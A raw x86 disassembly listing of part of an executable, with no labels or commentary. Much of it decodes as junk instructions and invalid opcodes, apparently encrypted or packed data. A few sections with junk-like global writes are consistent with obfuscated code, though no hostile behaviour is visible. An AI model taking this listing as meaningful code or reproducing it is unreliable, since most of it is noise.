  40a663:	fcom   DWORD PTR [ebx+0x45]
  40a666:	out    dx,al
  40a667:	sub    esp,DWORD PTR [ebp-0x6]
  40a66a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a66b:	retf   
  40a66c:	in     eax,0x36
  40a66e:	lock inc esi
  40a670:	mov    ch,BYTE PTR [edi-0x6e]
  40a673:	out    dx,al
  40a674:	stc    
  40a675:	xchg   BYTE PTR [edi-0x66ee0f76],bl
  40a67b:	push   esi
  40a67c:	aaa    
  40a67d:	inc    ebx
  40a67e:	ss shl edx,0x2e
  40a682:	mov    edi,0x550043a
  40a687:	adc    DWORD PTR ds:0x37d4d04d,0x2b1a8fa
  40a691:	jle    0x40a67a
  40a693:	aam    0x9e
  40a695:	dec    ecx
  40a696:	lea    ebx,[ecx+edx*8]
  40a699:	popa   
  40a69a:	push   0x4f
  40a69c:	jb     0x40a643
  40a69e:	xchg   edx,eax
  40a69f:	or     esi,DWORD PTR [ecx]
  40a6a1:	jno    0x40a6a7
  40a6a3:	daa    
  40a6a4:	int    0x88
  40a6a6:	fscale 
  40a6a8:	addr16 das 
  40a6aa:	xor    al,0x59
  40a6ac:	pop    ecx
  40a6ad:	mov    edx,0xc8ee98fe
  40a6b2:	jp     0x40a707
  40a6b4:	cld    
  40a6b5:	sub    ecx,DWORD PTR [eax+ecx*8+0x18]
  40a6b9:	jecxz  0x40a737
  40a6bb:	pop    ecx
  40a6bc:	in     al,dx
  40a6bd:	sub    al,0x94
  40a6bf:	sti    
  40a6c0:	(bad)  
  40a6c1:	jmp    0x1b75:0x798bc82e
  40a6c8:	stos   BYTE PTR es:[edi],al
  40a6c9:	aas    
  40a6ca:	jecxz  0x40a69c
  40a6cc:	popf   
  40a6cd:	cmp    DWORD PTR [ebp-0x62],ebp
  40a6d0:	xchg   edx,eax
  40a6d1:	outs   dx,BYTE PTR ds:[esi]
  40a6d2:	xor    esp,ebx
  40a6d4:	ins    BYTE PTR es:[edi],dx
  40a6d5:	mov    edx,0x7912150
  40a6da:	fld    QWORD PTR [eax-0xba8743b]
  40a6e0:	xchg   ebp,eax
  40a6e1:	or     al,0x35
  40a6e3:	in     eax,dx
  40a6e4:	mov    ds:0xf82ffc90,eax
  40a6e9:	adc    eax,0x3b0e1a54
  40a6ee:	clc    
  40a6ef:	mov    DWORD PTR ds:0x43366b,0x5aa8
  40a6f9:	jne    0x40b4e6
  40a6ff:	adc    DWORD PTR ds:0x433657,0xbfa
  40a709:	push   DWORD PTR [ebp+0x8]
  40a70c:	add    DWORD PTR ds:0x4336e7,0x7522
  40a716:	call   0x4115fc
  40a71b:	sbb    ecx,0x1aca
  40a721:	mov    DWORD PTR [ebp-0x20],eax
  40a724:	mov    eax,DWORD PTR [ebp-0x4]
  40a727:	xor    esi,esi
  40a729:	xor    esi,DWORD PTR ds:0x433717
  40a72f:	or     DWORD PTR ds:0x433723,esi
  40a735:	mov    ecx,DWORD PTR [ebp-0x20]
  40a738:	mov    esi,0x7510854
  40a73d:	xor    eax,esi
  40a73f:	add    DWORD PTR ds:0x433713,0x433607
  40a749:	add    eax,ebx
  40a74b:	mov    DWORD PTR ds:0x4336af,0x4f05
  40a755:	cmp    ecx,eax
  40a757:	mov    DWORD PTR ds:0x433667,0x525
  40a761:	je     0x40b9ed
  40a767:	add    DWORD PTR ds:0x4336ef,0x3590
  40a771:	push   DWORD PTR [ebp-0x20]
  40a774:	xor    DWORD PTR ds:0x4335ff,0x1906
  40a77e:	push   DWORD PTR [ebp+0x8]
  40a781:	dec    DWORD PTR ds:0x4336db
  40a787:	call   0x40eac8
  40a78c:	movzx  ecx,WORD PTR ds:0x43360b
  40a793:	sub    DWORD PTR ds:0x433623,ecx
  40a799:	jmp    0x40a9fc
  40a79e:	or     al,0xd4
  40a7a0:	and    ah,bl
  40a7a2:	loopne 0x40a78c
  40a7a4:	shl    ah,1
  40a7a6:	sti    
  40a7a7:	and    eax,0x3058ec0c
  40a7ac:	mov    bh,0x23
  40a7ae:	push   ss
  40a7af:	in     eax,dx
  40a7b0:	jle    0x40a830
  40a7b2:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40a7b6:	mov    ds:0x1228bc48,eax
  40a7bb:	mov    edx,0x819a2686
  40a7c0:	loopne 0x40a79b
  40a7c2:	(bad)  
  40a7c3:	out    dx,eax
  40a7c4:	pop    ds
  40a7c5:	pop    ecx
  40a7c6:	ins    DWORD PTR es:[edi],dx
  40a7c7:	xchg   ebp,eax
  40a7c8:	mov    ah,0xa6
  40a7ca:	xchg   esp,eax
  40a7cb:	cs jmp 0xe957:0xe4d9c4cc
  40a7d3:	dec    edi
  40a7d4:	fldcw  WORD PTR [ecx+esi*8]
  40a7d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a7d8:	(bad)  
  40a7d9:	or     eax,0x7d01379a
  40a7de:	int3   
  40a7df:	adc    dh,ch
  40a7e1:	mov    al,0x68
  40a7e3:	je     0x40a858
  40a7e5:	ins    DWORD PTR es:[edi],dx
  40a7e6:	ss mov bh,0x0
  40a7e9:	(bad)  
  40a7ea:	mov    ecx,0x26f48191
  40a7ef:	iret   
  40a7f0:	mov    WORD PTR [edi+0x6ef8bde9],gs
  40a7f6:	shl    DWORD PTR [ebp-0x4c4bf0fd],0x96
  40a7fd:	sbb    al,BYTE PTR [ebx]
  40a7ff:	ins    BYTE PTR es:[edi],dx
  40a800:	mov    bl,0x55
  40a802:	or     eax,0x55c4c6a1
  40a807:	fucom  st(0)
  40a809:	inc    ecx
  40a80a:	push   edi
  40a80b:	mov    ah,0xf1
  40a80d:	or     eax,0x130138da
  40a812:	ror    BYTE PTR [ebp+0x367393d6],cl
  40a818:	adc    al,0x4
  40a81a:	stos   DWORD PTR es:[edi],eax
  40a81b:	sub    BYTE PTR [ebp-0x625bb0c2],bl
  40a821:	mov    al,0xe5
  40a823:	retf   0x3733
  40a826:	cmc    
  40a827:	inc    ecx
  40a828:	add    eax,0xae57fb68
  40a82d:	mov    cl,0x48
  40a82f:	retf   
  40a830:	xchg   esi,eax
  40a831:	cmp    DWORD PTR [edx],ebx
  40a833:	imul   eax,DWORD PTR [edi+0x19],0x48ddc139
  40a83a:	or     dh,dl
  40a83c:	retf   
  40a83d:	push   es
  40a83e:	aas    
  40a83f:	add    edx,ecx
  40a841:	in     al,0x6b
  40a843:	leave  
  40a844:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a845:	dec    eax
  40a846:	out    0x22,al
  40a848:	jle    0x40a892
  40a84a:	inc    eax
  40a84b:	add    BYTE PTR [edx+0x15],bl
  40a84e:	es xchg ebp,eax
  40a850:	dec    edx
  40a851:	fwait
  40a852:	and    dh,bl
  40a854:	mov    edi,0x7a051f00
  40a859:	test   eax,0x75c2c977
  40a85e:	fsubr  DWORD PTR [edi+eiz*2-0x56]
  40a862:	pushf  
  40a863:	call   0xd6bfaf89
  40a868:	cmp    esi,DWORD PTR [edi-0x207aeeab]
  40a86e:	push   0x17611e14
  40a873:	ins    DWORD PTR es:[edi],dx
  40a874:	outs   dx,DWORD PTR ds:[esi]
  40a875:	ja     0x40a8df
  40a877:	loop   0x40a8c7
  40a879:	jmp    0x2068a9c2
  40a87e:	stos   BYTE PTR es:[edi],al
  40a87f:	add    al,0x10
  40a881:	aam    0x46
  40a883:	int3   
  40a884:	pop    esi
  40a885:	dec    esi
  40a886:	lods   al,BYTE PTR ds:[esi]
  40a887:	xor    bl,BYTE PTR [esi+0x7d]
  40a88a:	loopne 0x40a856
  40a88c:	call   0xaa28fbc
  40a891:	push   esp
  40a892:	mov    dh,0x1e
  40a894:	or     esi,DWORD PTR [edx-0x7893fdf0]
  40a89a:	mov    cl,0xb0
  40a89c:	in     eax,0xc
  40a89e:	lods   eax,DWORD PTR ds:[esi]
  40a89f:	test   eax,0x3337cb1b
  40a8a4:	adc    esp,DWORD PTR [edi+0x14395539]
  40a8aa:	aad    0xbf
  40a8ac:	mov    ?,WORD PTR [eax+0x77]
  40a8af:	jl     0x40a87f
  40a8b1:	mov    eax,0x355b7ba9
  40a8b6:	iret   
  40a8b7:	xor    dl,BYTE PTR [edx]
  40a8b9:	push   0xe8912cbc
  40a8be:	inc    esi
  40a8bf:	int3   
  40a8c0:	push   ss
  40a8c1:	add    al,0xad
  40a8c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a8c4:	retf   
  40a8c5:	mov    bl,0x28
  40a8c7:	mov    ds,WORD PTR [edi-0x1b]
  40a8ca:	inc    ebp
  40a8cb:	daa    
  40a8cc:	cmp    esi,edx
  40a8ce:	and    al,0x22
  40a8d0:	jno    0x40a8fb
  40a8d2:	xlat   BYTE PTR ds:[ebx]
  40a8d3:	pop    esi
  40a8d4:	and    eax,0x8584f4b8
  40a8d9:	jp     0x40a934
  40a8db:	not    ebx
  40a8dd:	sub    al,BYTE PTR [edx+0x76]
  40a8e0:	jle    0x40a882
  40a8e2:	shl    BYTE PTR [ebp+ebx*1+0x734689b3],cl
  40a8e9:	pop    ebp
  40a8ea:	icebp  
  40a8eb:	push   ecx
  40a8ec:	pop    edx
  40a8ed:	call   0x1a1c:0xeafc631c
  40a8f4:	mov    cl,BYTE PTR [edi+0x17d018ba]
  40a8fa:	popa   
  40a8fb:	sar    DWORD PTR [esi+0x21],cl
  40a8fe:	(bad)  
  40a8ff:	ret    
  40a900:	xor    dh,BYTE PTR ss:[esi-0x59]
  40a904:	std    
  40a905:	inc    ecx
  40a906:	or     BYTE PTR [edi+0x1d7ab710],dl
  40a90c:	inc    ebp
  40a90d:	cwde   
  40a90e:	xor    BYTE PTR [edx+0x2f],0x1d
  40a912:	ds mov eax,0x68bef06b
  40a918:	lock sti 
  40a91a:	fadd   DWORD PTR [edi+0x47242a9a]
  40a920:	test   DWORD PTR [esi+0x41],esp
  40a923:	xchg   ecx,eax
  40a924:	sbb    al,0xc0
  40a926:	in     al,dx
  40a927:	jmp    0x10e122a9
  40a92c:	xor    al,0x55
  40a92e:	inc    ebx
  40a92f:	hlt    
  40a930:	shl    DWORD PTR ds:[edi-0x2dd2ba63],cl
  40a937:	pop    eax
  40a938:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a939:	aad    0x42
  40a93b:	scas   eax,DWORD PTR es:[edi]
  40a93c:	sar    DWORD PTR [ecx+0x3f],1
  40a93f:	sub    BYTE PTR [edx-0x1c4ded03],ch
  40a945:	mov    cl,0xbc
  40a947:	fs inc edi
  40a949:	sbb    al,0xe7
  40a94b:	iret   
  40a94c:	(bad)  
  40a94d:	int3   
  40a94e:	jno    0x40a8d8
  40a950:	jnp    0x40a929
  40a952:	out    dx,al
  40a953:	dec    al
  40a955:	xchg   BYTE PTR [edi+0x5f047e18],ah
  40a95b:	push   0xdcc1afee
  40a960:	loop   0x40a918
  40a962:	loop   0x40a928
  40a964:	lods   al,BYTE PTR ds:[esi]
  40a965:	int    0xae
  40a967:	scas   al,BYTE PTR es:[edi]
  40a968:	mov    ebx,0x52307502
  40a96d:	inc    esi
  40a96e:	jo     0x40a97f
  40a970:	mov    ah,0xfb
  40a972:	xor    eax,DWORD PTR [ecx-0x45]
  40a975:	neg    DWORD PTR [ecx-0x78617019]
  40a97b:	adc    cl,BYTE PTR [edx]
  40a97d:	cdq    
  40a97e:	fwait
  40a97f:	je     0x40a911
  40a981:	imul   edi,DWORD PTR [ebp+0x685e0082],0xe78cd518
  40a98b:	mov    cl,0x6d
  40a98d:	cmp    BYTE PTR [ecx-0x6e],cl
  40a990:	shl    esi,cl
  40a992:	or     al,BYTE PTR [ebx-0x75]
  40a995:	mov    BYTE PTR [ebp+0x2a39f630],bl
  40a99b:	shr    DWORD PTR [edi],1
  40a99d:	sbb    al,0xa3
  40a99f:	inc    ebp
  40a9a0:	dec    ebp
  40a9a1:	mov    ah,0x3d
  40a9a3:	lea    ebx,[ebp+0x1d]
  40a9a6:	mov    al,ds:0x541c55aa
  40a9ab:	adc    bl,bh
  40a9ad:	dec    esi
  40a9ae:	jmp    0x40aa0b
  40a9b0:	shl    BYTE PTR ds:0xf98812c,0xab
  40a9b7:	push   ebp
  40a9b8:	nop
  40a9b9:	mov    bh,0xda
  40a9bb:	push   0xbf489fde
  40a9c0:	push   cs
  40a9c1:	and    DWORD PTR [ecx+edx*4-0x3f9a98c3],edi
  40a9c8:	loopne 0x40aa19
  40a9ca:	jne    0x40a9ee
  40a9cc:	out    0xd5,eax
  40a9ce:	fcomp  DWORD PTR [eax+0x1a23333b]
  40a9d4:	clc    
  40a9d5:	bound  eax,QWORD PTR [eax+ebx*1-0x3d]
  40a9d9:	dec    eax
  40a9da:	cwde   
  40a9db:	cmp    edx,DWORD PTR [ebx-0x6f7152b0]
  40a9e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a9e2:	clc    
  40a9e3:	out    0x4c,al
  40a9e5:	out    dx,eax
  40a9e6:	loopne 0x40aa51
  40a9e8:	sahf   
  40a9e9:	xchg   esi,eax
  40a9ea:	inc    eax
  40a9eb:	ficom  WORD PTR [ebp+0x39]
  40a9ee:	scas   eax,DWORD PTR es:[edi]
  40a9ef:	push   edx
  40a9f0:	lds    ecx,FWORD PTR [ebx]
  40a9f2:	je     0x40aa53
  40a9f4:	mov    dl,0xe3
  40a9f6:	or     eax,0xceb3ac2b
  40a9fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9fc:	mov    DWORD PTR [ebp-0x14],eax
  40a9ff:	mov    eax,DWORD PTR [ebp-0x4]
  40aa02:	xor    DWORD PTR ds:0x433617,edi
  40aa08:	mov    ecx,DWORD PTR [ebp-0x14]
  40aa0b:	xor    eax,esi
  40aa0d:	adc    DWORD PTR ds:0x433717,0x4336e7
  40aa17:	add    eax,ebx
  40aa19:	mov    DWORD PTR ds:0x433667,0x6600
  40aa23:	jmp    0x40ac86
  40aa28:	dec    ebp
  40aa29:	ret    
  40aa2a:	xchg   esp,eax
  40aa2b:	push   eax
  40aa2c:	nop
  40aa2d:	push   ecx
  40aa2e:	dec    ecx
  40aa2f:	ret    
  40aa30:	mov    esp,DWORD PTR es:[edx+eiz*2]
  40aa34:	ficom  DWORD PTR [eax-0xc]
  40aa37:	mov    dl,al
  40aa39:	jmp    0x40aab9
  40aa3b:	jle    0x40aa75
  40aa3d:	jl     0x40aabd
  40aa3f:	jle    0x40aab5
  40aa41:	xchg   BYTE PTR [ebx],bl
  40aa43:	jae    0x40aa69
  40aa45:	out    dx,al
  40aa46:	mov    esi,0x3a7075a5
  40aa4b:	and    dl,BYTE PTR [eax+ecx*1-0x1c52cc29]
  40aa52:	fcomp  QWORD PTR [ecx+ecx*2-0x3c]
  40aa56:	scas   al,BYTE PTR es:[edi]
  40aa57:	sbb    esi,DWORD PTR [esi]
  40aa59:	xchg   edx,eax
  40aa5a:	(bad)  
  40aa5b:	mov    ebx,0x2bdcfdd2
  40aa60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa61:	cmp    BYTE PTR [edx],ch
  40aa63:	fs push edi
  40aa65:	rcr    DWORD PTR [edi+0x49],1
  40aa68:	outs   dx,DWORD PTR ds:[esi]
  40aa69:	pop    edi
  40aa6a:	push   ebx
  40aa6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa6c:	adc    dh,BYTE PTR [esi+0x2c2e935d]
  40aa72:	in     al,dx
  40aa73:	int3   
  40aa74:	push   es
  40aa75:	out    dx,eax
  40aa76:	loope  0x40aadb
  40aa78:	pop    DWORD PTR [edi-0x16]
  40aa7b:	dec    edi
  40aa7c:	retf   
  40aa7d:	inc    ecx
  40aa7e:	inc    ebx
  40aa7f:	es jnp 0x40aa6d
  40aa82:	cli    
  40aa83:	out    0x66,al
  40aa85:	or     BYTE PTR [ecx+0xf],0x51
  40aa89:	jmp    0xd01c7ae8
  40aa8e:	aaa    
  40aa8f:	shr    DWORD PTR [esi+0x256b2229],1
  40aa95:	sub    BYTE PTR [esi+0x3dfa072c],al
  40aa9b:	mov    edi,0x31ae6311
  40aaa0:	adc    esi,ebx
  40aaa2:	out    0xe9,eax
  40aaa4:	adc    eax,DWORD PTR [ecx+0x26e5f0a7]
  40aaaa:	inc    ecx
  40aaab:	into   
  40aaac:	dec    esp
  40aaad:	lods   eax,DWORD PTR ds:[esi]
  40aaae:	test   DWORD PTR [ebx],eax
  40aab0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aab1:	sub    cl,bl
  40aab3:	sub    BYTE PTR gs:[ebx+0x13],bh
  40aab7:	mov    ebp,0x68135cbc
  40aabc:	adc    BYTE PTR ds:0x6205bdc1,ch
  40aac2:	lock inc esp
  40aac4:	jge    0x40ab25
  40aac6:	mov    eax,ds:0xb285405a
  40aacb:	in     al,0xd9
  40aacd:	arpl   WORD PTR [edx+0x44e0fdd5],bp
  40aad3:	into   
  40aad4:	retf   0xd8a0
  40aad7:	and    DWORD PTR [eax-0x2],edi
  40aada:	jg     0x40aace
  40aadc:	push   esp
  40aadd:	lea    esp,[ebx-0x37ad7efb]
  40aae3:	sbb    al,0x74
  40aae5:	retf   0x3a8d
  40aae8:	aaa    
  40aae9:	push   esi
  40aaea:	mov    dh,0xf6
  40aaec:	push   ebx
  40aaed:	aad    0xb5
  40aaef:	fist   DWORD PTR es:[esi+edi*8+0x22276fbb]
  40aaf7:	and    eax,0x9d856f7f
  40aafc:	adc    DWORD PTR [ebx+eiz*4-0x37],esp
  40ab00:	mov    esi,0xecc6a0b7
  40ab05:	xchg   ecx,eax
  40ab06:	xor    DWORD PTR [edi+eiz*1+0x3d6c5dc4],0x30353b45
  40ab11:	pop    ebx
  40ab12:	dec    ecx
  40ab13:	(bad)  
  40ab14:	cmp    DWORD PTR [edx],ecx
  40ab16:	or     eax,0xcd291002
  40ab1b:	cdq    
  40ab1c:	jg     0x40aae4
  40ab1e:	popa   
  40ab1f:	push   0xb339d601
  40ab24:	fistp  DWORD PTR [edi]
  40ab26:	test   BYTE PTR [ebx],0x52
  40ab29:	leave  
  40ab2a:	in     eax,dx
  40ab2b:	in     eax,0xcb
  40ab2d:	sub    edi,DWORD PTR [ecx+0x72]
  40ab30:	imul   edi,DWORD PTR [esi-0x68c8221e],0xffffff97
  40ab37:	lds    esp,FWORD PTR [esi+0x18]
  40ab3a:	jl     0x40ab64
  40ab3c:	repnz dec ch
  40ab3f:	jb     0x40aac9
  40ab41:	test   DWORD PTR [edi+0x11f9f811],edi
  40ab47:	sti    
  40ab48:	or     BYTE PTR [edx],0x29
  40ab4b:	inc    ecx
  40ab4c:	(bad)  
  40ab4d:	mov    cl,0xe8
  40ab4f:	ins    BYTE PTR es:[edi],dx
  40ab50:	push   es
  40ab51:	rcr    DWORD PTR [edi+0x47],0xdd
  40ab55:	(bad)  
  40ab56:	rcr    BYTE PTR ds:0x80c58a1b,cl
  40ab5c:	pop    esp
  40ab5d:	dec    ebp
  40ab5e:	sub    ecx,DWORD PTR [ebp+0x34f2067d]
  40ab64:	cwde   
  40ab65:	dec    esi
  40ab66:	xchg   BYTE PTR [esi+0x79],dl
  40ab69:	lock mov bl,dh
  40ab6c:	leave  
  40ab6d:	fist   DWORD PTR [ecx-0x37f67f6d]
  40ab73:	mov    eax,ds:0x601f49b1
  40ab78:	fistp  DWORD PTR [ecx+0x4d]
  40ab7b:	fnsave [ebp+0x34f01a8c]
  40ab81:	nop
  40ab82:	mov    ebp,0xa9529c1a
  40ab87:	data16 jns 0x40abdd
  40ab8a:	lods   al,BYTE PTR ds:[esi]
  40ab8b:	rcl    BYTE PTR [ebx],0xa7
  40ab8e:	add    ebp,esi
  40ab90:	fild   DWORD PTR [edi+0x7b]
  40ab93:	jle    0x40abed
  40ab95:	les    esp,FWORD PTR [ebp+0x3e]
  40ab98:	xchg   BYTE PTR [edi-0x5b],bl
  40ab9b:	(bad)  
  40ab9c:	jmp    FWORD PTR [ecx+0x290acf8c]
  40aba2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aba3:	sbb    eax,0x2b2e0a0f
  40aba8:	or     DWORD PTR [ecx],eax
  40abaa:	mov    ah,BYTE PTR [edx-0x5405bc96]
  40abb0:	daa    
  40abb1:	stc    
  40abb2:	(bad)  
  40abb3:	xchg   esi,eax
  40abb4:	mov    ebx,0x7fa770a4
  40abb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abba:	inc    edx
  40abbb:	jge    0x40ac04
  40abbd:	adc    ebp,0x10
  40abc0:	shl    BYTE PTR [edx+ebx*4-0x2d],0x8b
  40abc5:	and    bl,BYTE PTR [edi+eiz*8]
  40abc8:	ds call 0x39bc:0xf0bfdc55
  40abd0:	into   
  40abd1:	aaa    
  40abd2:	aas    
  40abd3:	fs dec ebp
  40abd5:	in     eax,0x29
  40abd7:	mov    dh,BYTE PTR [esi-0x1361b884]
  40abdd:	out    0xd3,al
  40abdf:	(bad)  
  40abe0:	repz dec esi
  40abe2:	arpl   WORD PTR ds:0x45c6e33,bx
  40abe8:	aas    
  40abe9:	and    DWORD PTR [esp+edx*2],esp
  40abec:	aad    0x44
  40abee:	add    eax,0xd1f5ca92
  40abf3:	jne    0x40ac42
  40abf5:	inc    eax
  40abf6:	sbb    DWORD PTR [ecx+0x40],ecx
  40abf9:	dec    ebx
  40abfa:	or     cl,BYTE PTR [ebx+0x58]
  40abfd:	jbe    0x40ab86
  40abff:	mov    cl,0xc3
  40ac01:	inc    ecx
  40ac02:	add    BYTE PTR [ebx],ch
  40ac04:	mov    cl,0x5b
  40ac06:	jo     0x40ac28
  40ac08:	jg     0x40aba5
  40ac0a:	(bad)  
  40ac0b:	jmp    0x5a66:0xfc2d9a4f
  40ac12:	es enter 0x4e8a,0x1e
  40ac17:	cmc    
  40ac18:	xor    edi,edi
  40ac1a:	dec    ecx
  40ac1b:	test   eax,0xa51fdbcb
  40ac20:	or     esi,DWORD PTR ds:0xfdf74683
  40ac26:	adc    DWORD PTR [ecx],esp
  40ac28:	mov    dh,0x6
  40ac2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac2b:	add    al,0x1c
  40ac2d:	add    al,0x65
  40ac2f:	(bad)  
  40ac31:	jbe    0x40ac2f
  40ac33:	loop   0x40ac4a
  40ac35:	je     0x40ac5b
  40ac37:	xchg   esp,eax
  40ac38:	xchg   ebx,eax
  40ac39:	jo     0x40acb2
  40ac3b:	and    esi,DWORD PTR [esi-0x35fc6b98]
  40ac41:	adc    BYTE PTR [ecx+ecx*2],dh
  40ac44:	pop    es
  40ac45:	inc    ebx
  40ac46:	add    BYTE PTR [ebp+0x2a9dc86e],dl
  40ac4c:	inc    edi
  40ac4d:	leave  
  40ac4e:	adc    eax,0x91501b9e
  40ac53:	ror    BYTE PTR [ebp+0x12],1
  40ac56:	pop    edx
  40ac57:	icebp  
  40ac58:	popf   
  40ac59:	stc    
  40ac5a:	jno    0x40ac53
  40ac5c:	xor    eax,0xbc8a9505
  40ac61:	xlat   BYTE PTR ds:[ebx]
  40ac62:	cdq    
  40ac63:	jns    0x40ac6b
  40ac65:	and    BYTE PTR [ebp-0x73],cl
  40ac68:	out    dx,al
  40ac69:	xchg   ecx,eax
  40ac6a:	bound  eax,QWORD PTR [edx*4-0x108b6129]
  40ac71:	pop    esi
  40ac72:	pop    edx
  40ac73:	aaa    
  40ac74:	pop    ecx
  40ac75:	dec    esp
  40ac76:	cmp    al,0x2b
  40ac78:	nop
  40ac79:	hlt    
  40ac7a:	pusha  
  40ac7b:	xchg   DWORD PTR [ecx-0x54564d80],edi
  40ac81:	dec    ecx
  40ac82:	mov    ebx,0x3bf8a6ab
  40ac87:	enter  0x840f,0x5f
  40ac8b:	or     eax,0x1d810000
  40ac90:	imul   esi,DWORD PTR [esi],0x43
  40ac93:	add    BYTE PTR [ebx],dl
  40ac95:	je     0x40ac97
  40ac97:	add    BYTE PTR [ebx+0x2581ec45],cl
  40ac9d:	out    dx,eax
  40ac9e:	ss inc ebx
  40aca0:	add    BYTE PTR [eax],al
  40aca2:	add    BYTE PTR [eax],al
  40aca4:	add    BYTE PTR [ebx],dh
  40aca6:	leave  
  40aca7:	or     ecx,DWORD PTR ds:0x4336ef
  40acad:	inc    ecx
  40acae:	mov    DWORD PTR ds:0x4336ef,ecx
  40acb4:	cmp    DWORD PTR ds:0x4336ef,0x6
  40acbb:	jne    0x40acdb
  40acc1:	push   0x433788
  40acc6:	push   0x4337cc
  40accb:	push   0x3fa4
  40acd0:	push   0x125d
  40acd5:	call   DWORD PTR ds:0x4120e4
  40acdb:	cmp    DWORD PTR ds:0x4336ef,0x5
  40ace2:	jne    0x40acf7
  40ace8:	xor    ecx,ecx
  40acea:	or     ecx,DWORD PTR ds:0x4336ef
  40acf0:	inc    ecx
  40acf1:	mov    DWORD PTR ds:0x4336ef,ecx
  40acf7:	cmp    DWORD PTR ds:0x4336ef,0x1a
  40acfe:	jb     0x40aca5
  40ad04:	adc    DWORD PTR ds:0x43369f,0xf8d
  40ad0e:	jmp    0x40af71
  40ad13:	stos   DWORD PTR es:[edi],eax
  40ad14:	adc    eax,0x70b1f693
  40ad19:	imul   edx,DWORD PTR [ecx+0x53],0x49
  40ad1d:	adc    BYTE PTR [esi-0x30cf0307],bh
  40ad23:	call   0x7e7c:0x387e7ee9
  40ad2a:	jle    0x40ad95
  40ad2c:	loope  0x40ad00
  40ad2e:	stos   WORD PTR es:[edi],ax
  40ad30:	lods   al,BYTE PTR ds:[esi]
  40ad31:	xor    esp,DWORD PTR [esi]
  40ad33:	std    
  40ad34:	repz ret 
  40ad36:	inc    esi
  40ad37:	retf   0xa319
  40ad3a:	loope  0x40adb9
  40ad3c:	jb     0x40aceb
  40ad3e:	scas   eax,DWORD PTR es:[edi]
  40ad3f:	add    eax,0x8bc252ea
  40ad44:	inc    ecx
  40ad45:	and    DWORD PTR [ebx-0x4d],edi
  40ad48:	pop    edi
  40ad49:	mov    ebx,0x7b9445de
  40ad4e:	out    0xe7,eax
  40ad50:	js     0x40ad50
  40ad52:	add    eax,0x275b129a
  40ad57:	ss es push 0xc891c94b
  40ad5e:	push   ss
  40ad5f:	adc    al,0xc2
  40ad61:	mov    eax,0xab164b01
  40ad66:	inc    ebp
  40ad67:	pop    ebp
  40ad68:	inc    ecx
  40ad69:	cli    
  40ad6a:	in     eax,0xc6
  40ad6c:	add    al,0xa1
  40ad6e:	fidivr WORD PTR [esp+eax*2]
  40ad71:	jmp    0x40ad1d
  40ad73:	sbb    al,0xec
  40ad75:	cmp    BYTE PTR [eax*2+0x525375ee],dh
  40ad7c:	mov    ecx,0xa8b42753
  40ad81:	fcmovnbe st,st(7)
  40ad83:	xor    al,0x39
  40ad85:	xchg   esi,eax
  40ad86:	call   0x1094:0xec3a0561
  40ad8d:	cmc    
  40ad8e:	test   BYTE PTR [ebx+0x3c],dl
  40ad91:	cdq    
  40ad92:	into   
  40ad93:	cmc    
  40ad94:	sub    BYTE PTR [ebp-0x297fb305],bl
  40ad9a:	loope  0x40ada6
  40ad9c:	sub    BYTE PTR [edi+0x7],ah
  40ad9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ada0:	mov    ebp,0xf343ffe3
  40ada5:	push   cs
  40ada6:	or     ah,0x2f
  40ada9:	sahf   
  40adaa:	cmp    dl,ch
  40adac:	and    DWORD PTR [ebx-0x1d],0x78
  40adb0:	repnz sub cl,BYTE PTR [eax+ebp*2-0x38]
  40adb5:	and    al,0x29
  40adb7:	out    dx,al
  40adb8:	pop    ss
  40adb9:	gs dec ebx
  40adbb:	retf   0xd8fd
  40adbe:	rcr    DWORD PTR [esi+ecx*8-0x64],0xee
  40adc3:	pop    ecx
  40adc4:	mov    ah,0x81
  40adc6:	or     bl,BYTE PTR gs:[edi]
  40adc9:	icebp  
  40adca:	cmc    
  40adcb:	jae    0x40ad68
  40adcd:	pushf  
  40adce:	inc    ecx
  40adcf:	xor    edi,DWORD PTR [edi-0x2202a202]
  40add5:	mov    edx,0x21ef9ac1
  40adda:	cmp    edi,DWORD PTR [edx+0x40]
  40addd:	ins    DWORD PTR es:[edi],dx
  40adde:	jns    0x40ae0e
  40ade0:	mov    ebp,0x736bde5d
  40ade5:	sub    al,0x3b
  40ade7:	push   cs
  40ade8:	xchg   ebp,eax
  40ade9:	scas   al,BYTE PTR es:[edi]
  40adea:	jns    0x40ae62
  40adec:	add    eax,DWORD PTR [eax-0x2124afde]
  40adf2:	xor    BYTE PTR [ebp-0xc7fc8c8],cl
  40adf8:	ret    
  40adf9:	nop
  40adfa:	in     al,0x55
  40adfc:	rol    DWORD PTR [ebp-0x17],1
  40adff:	jmp    0xf337:0x91bc445c
  40ae06:	sub    bl,ah
  40ae08:	mov    edi,0x8c3f1b0
  40ae0d:	inc    BYTE PTR [esi+0x7b]
  40ae10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae11:	add    BYTE PTR [ebx+ebx*2-0x1],ch
  40ae15:	rcl    BYTE PTR [esi-0x41],0xef
  40ae19:	inc    edi
  40ae1a:	xchg   ebp,eax
  40ae1b:	xchg   edi,eax
  40ae1c:	int    0x3e
  40ae1e:	pop    edi
  40ae1f:	lods   eax,DWORD PTR ds:[esi]
  40ae20:	fidivr DWORD PTR [edx+0x31]
  40ae23:	stc    
  40ae24:	ins    DWORD PTR es:[edi],dx
  40ae25:	jmp    0x6492:0x8a1e6949
  40ae2c:	adc    al,BYTE PTR [ecx-0x5a203963]
  40ae32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae33:	add    eax,0x741a5bf4
  40ae38:	sbb    esi,ebx
  40ae3a:	xchg   DWORD PTR [edi+0x5],edi
  40ae3d:	and    edx,ebx
